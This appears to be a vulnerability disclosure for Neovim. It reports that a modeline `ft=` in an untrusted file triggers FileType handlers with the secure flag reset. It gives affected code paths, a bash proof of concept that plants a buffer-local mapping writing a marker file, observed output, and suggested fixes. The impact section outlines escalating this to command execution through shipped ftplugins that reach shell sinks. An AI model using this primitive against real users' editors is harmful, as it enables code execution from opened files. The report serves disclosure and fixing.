# SVE: modeline-selected filetype handlers escape the secure side-effect boundary

## Summary

An attacker-controlled file can use a modeline such as `vim: set ft=pwn :`
to select a `FileType` handler graph. Neovim validates the selector string,
but then treats that validation as if it also made the selected handler side
effects safe. That is the broken invariant: the `filetype` token is data, but
`FileType` handlers are arbitrary Ex/Lua code.

The confirmed primitive is: open an untrusted file -> modeline changes
`'filetype'` -> Neovim runs matching `FileType` autocommands with
`secure` reset -> the handler can install buffer-local mappings, commands, or
other callback state. In real user setups this is the same boundary used by
ftplugins, syntax plugins, and plugin-defined `FileType` hooks. If any selected
handler invokes `system()`, `jobstart()`, `:!`, or another command sink with
filename/path-derived input, this becomes command execution through the
modeline-selected handler path.

## Affected boundary

- `src/nvim/buffer.c`: modeline processing enters `secure = 1` before
  calling `do_set(..., OPT_MODELINE | OPT_LOCAL ...)`.
- `src/nvim/optionstr.c`: `did_set_filetype_or_syntax()` accepts names that
  pass `valid_filetype()` and sets `os_value_checked = true`.
- `src/nvim/option.c`: after setting `'filetype'`, Neovim still calls
  `do_filetype_autocmd()` from a modeline when the value changed.
- `src/nvim/autocmd.c`: `do_filetype_autocmd()` resets `secure = 0` because
  the filetype value was checked, then runs `EVENT_FILETYPE` handlers.
- `src/nvim/mapping.c`: `:map` in secure mode only echoes the command before
  continuing into `do_exmap()`; once `secure` is reset, the selected handler
  can install mappings normally.

This is not a `'modelineexpr'` issue. The reproducer uses default-on
`'modeline'` and a normal `ft=` modeline.

## Reproduction

Tested locally with:

```text
NVIM v0.12.1
Build type: Release
```

Run:

```bash
set -eu
tmpdir=$(mktemp -d)

cat > "$tmpdir/with-modeline.txt" <<'EOF'
hello
# vim: set ft=pwn :
EOF

cat > "$tmpdir/without-modeline.txt" <<'EOF'
hello
EOF

nvim -u NONE -i NONE -n --headless \
  --cmd "set nomore modeline modelines=1" \
  --cmd "autocmd FileType pwn nnoremap <buffer> gP :call writefile(['FIRED'], '$tmpdir/pwn-fired.txt')<CR>" \
  "$tmpdir/with-modeline.txt" \
  "+call writefile([string(maparg('gP','n',0,1))], '$tmpdir/with-map.txt')" \
  "+normal gP" \
  "+qa!"

nvim -u NONE -i NONE -n --headless \
  --cmd "set nomore modeline modelines=1" \
  --cmd "autocmd FileType pwn nnoremap <buffer> gP :call writefile(['FIRED'], '$tmpdir/should-not-fire.txt')<CR>" \
  "$tmpdir/without-modeline.txt" \
  "+call writefile([string(maparg('gP','n',0,1))], '$tmpdir/without-map.txt')" \
  "+silent! normal gP" \
  "+qa!"

printf 'with-map='
cat "$tmpdir/with-map.txt"
printf '\nwith-fired='
cat "$tmpdir/pwn-fired.txt"
printf '\nwithout-map='
cat "$tmpdir/without-map.txt"
printf '\nwithout-fired-exists='
test -e "$tmpdir/should-not-fire.txt" && echo yes || echo no
```

Observed:

```text
with-map={'lhs': 'gP', 'mode': 'n', 'expr': 0, 'sid': -2, 'lnum': 0, 'noremap': 1, 'nowait': 0, 'rhs': ':call writefile([''FIRED''], ''/tmp/tmp.Lh8IJpLmSQ/pwn-fired.txt'')<CR>', 'lhsraw': 'gP', 'abbr': 0, 'script': 0, 'replace_keycodes': 0, 'mode_bits': 1, 'silent': 0, 'buffer': 1, 'scriptversion': 1}

with-fired=FIRED

without-map={}

without-fired-exists=no
```

Expected behavior: the modeline path should not let untrusted file content
select a handler graph that can install executable editor state. Either the
`FileType` event should not fire from a modeline, or its side effects should
remain constrained by the same secure policy that protected the modeline itself.

Actual behavior: the modeline-selected `FileType pwn` handler installed a
buffer-local mapping, and triggering that mapping performed the configured side
effect. Without the modeline, the handler was never selected and no mapping or
side effect existed.

## Impact

The minimum confirmed impact is unauthorized handler selection and executable
editor-state mutation from file content. The attacker controls the `ft=`
selector in an opened file; the victim supplies the existing trusted handler
graph through normal filetype plugins, runtime ftplugins, or user/plugin
`FileType` autocommands.

This matters because filetype handlers routinely create mappings, commands,
compiler settings, keyword programs, and callbacks. Task 22's higher-value
variant is to pair this selector primitive with a shipped ftplugin, indent file,
syntax file, or common plugin handler that reaches `system()`, `jobstart()`,
`:!`, or another shell/process sink using attacker-influenced filename or path
data.

## Fix

The fix should preserve a strict separation between selector validation and
handler side-effect safety.

Recommended direction:

1. Do not clear `secure` in `do_filetype_autocmd()` solely because
   `valid_filetype()` accepted the selector.
2. When `'filetype'` or `'syntax'` is set from `OPT_MODELINE`, either:
   - suppress `FileType` / `Syntax` autocommands and only store the option
     value, or
   - run the matching autocommands in a constrained mode where mappings,
     commands, Lua callbacks, jobs, shell commands, and other executable state
     changes are rejected.
3. Add regression tests where a modeline-set `ft=` or `syn=` selects a
   handler that tries to create a buffer-local mapping, command, Lua keymap, and
   job/shell side effect. The tests should assert that those side effects fail
   or do not occur.
4. Audit shipped `runtime/ftplugin/*`, `runtime/indent/*`, and
   `runtime/syntax/*` for process sinks that assume the filetype selection was
   trusted.

The key rule is: validating `pwn` as a legal filetype name must not imply that
the `FileType pwn` handler body is safe to run as a consequence of untrusted
file content.
